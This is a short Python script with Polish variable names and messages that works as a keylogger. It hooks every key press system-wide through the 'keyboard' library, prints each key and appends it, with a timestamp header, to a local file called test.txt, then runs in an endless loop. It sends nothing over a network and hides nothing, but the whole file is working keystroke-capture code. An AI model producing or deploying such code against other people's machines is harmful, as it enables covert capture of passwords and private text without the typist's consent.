import keyboard
import time

nazwa_pliku = "test.txt"
time_now = time.localtime()
lokalnie = time.strftime("month: %d %B\nhour: %H:%M:%S\n", time_now)

with open(nazwa_pliku, 'a') as plik:
    plik.writelines(lokalnie)
def on_key_pressed(e):
    if e.name not in ["shift", "ctrl", "alt", "alt gr", "backspace"]:
        print(f"Przycisk '{e.name}' został wciśnięty.")
        with open(nazwa_pliku, 'a') as plik:

            if e.name in ["down", "up", "left", "right", "caps lock"]:
                plik.writelines(e.name + "\n")

            elif e.name == "space":
                plik.writelines(f" ({e.name}) ")

            elif e.name == "enter":
                plik.writelines(f" ({e.name}) \n")

            else:
                plik.writelines(e.name)



keyboard.on_press(on_key_pressed)

while True:
    pass

